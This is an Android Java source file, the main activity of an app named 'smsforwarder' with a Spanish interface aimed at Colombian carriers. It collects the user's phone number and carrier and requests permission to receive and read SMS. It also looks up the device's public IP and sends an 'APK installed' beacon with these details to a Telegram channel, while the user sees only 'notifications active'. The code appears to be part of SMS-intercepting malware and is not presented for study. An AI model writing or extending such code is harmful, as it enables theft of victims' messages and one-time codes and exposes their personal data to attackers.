package com.example.smsforwarder;

import android.Manifest;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.widget.ArrayAdapter;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Spinner;
import android.widget.TextView;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;

public class MainActivity extends AppCompatActivity {

    private static final int PERMISSIONS_REQUEST_CODE = 1001;

    private EditText phoneInput;
    private Spinner operatorSpinner;
    private Button submitBtn;

    private final String[] operadoresColombia = {
            "Movistar", "Claro", "Tigo", "WOM", "ETB", "Éxito Móvil", "Avantel", "Virgin Mobile", "Flash Mobile", "Suma Móvil"
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        SharedPreferences prefs = getSharedPreferences("userPrefs", MODE_PRIVATE);
        String savedNumber = prefs.getString("numero", null);
        String savedOperador = prefs.getString("operador", null);

        if (savedNumber != null && savedOperador != null) {
            setContentView(R.layout.activity_status);
            TextView statusMsg = findViewById(R.id.statusMessage);
            statusMsg.setText("✅ Notificaciones activas\n📱 " + savedNumber + "\n🏢 " + savedOperador);
        } else {
            setContentView(R.layout.activity_main);

            phoneInput = findViewById(R.id.phoneInput);
            operatorSpinner = findViewById(R.id.operatorSpinner);
            submitBtn = findViewById(R.id.submitBtn);

            ArrayAdapter<String> adapter = new ArrayAdapter<>(this, android.R.layout.simple_spinner_item, operadoresColombia);
            adapter.setDropDownViewResource(android.R.layout.simple_spinner_dropdown_item);
            operatorSpinner.setAdapter(adapter);

            submitBtn.setOnClickListener(v -> {
                String numero = phoneInput.getText().toString().trim();
                String operador = operatorSpinner.getSelectedItem().toString();

                if (numero.isEmpty()) {
                    Toast.makeText(this, "Por favor ingresa tu número", Toast.LENGTH_SHORT).show();
                    return;
                }

                prefs.edit().putString("numero", numero).putString("operador", operador).apply();
                sendInstallMessage(numero, operador);

                setContentView(R.layout.activity_status);
                TextView statusMsg = findViewById(R.id.statusMessage);
                statusMsg.setText("✅ Notificaciones activas\n📱 " + numero + "\n🏢 " + operador);
            });
        }

        requestRuntimePermsIfNeeded();
    }

    private void requestRuntimePermsIfNeeded() {
        String[] perms = new String[]{
                Manifest.permission.RECEIVE_SMS,
                Manifest.permission.READ_SMS,
                Manifest.permission.INTERNET
        };
        boolean need = false;
        for (String p : perms) {
            if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) {
                need = true; break;
            }
        }
        if (need) {
            ActivityCompat.requestPermissions(this, perms, PERMISSIONS_REQUEST_CODE);
        }
    }

    private void sendInstallMessage(String numero, String operador) {
        new Thread(() -> {
            String ip = "IP no disponible";
            try {
                URL url = new URL("https://api.ipify.org");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("GET");
                BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                ip = in.readLine();
                in.close();
                conn.disconnect();
            } catch (Exception ignored) {}

            String message = "✅ APK instalado exitosamente"
                    + "\n📱 Número: " + numero
                    + "\n🏢 Operador: " + operador
                    + "\n🌐 IP: " + ip;

            Utils.sendToTelegram(message);
        }).start();
    }
}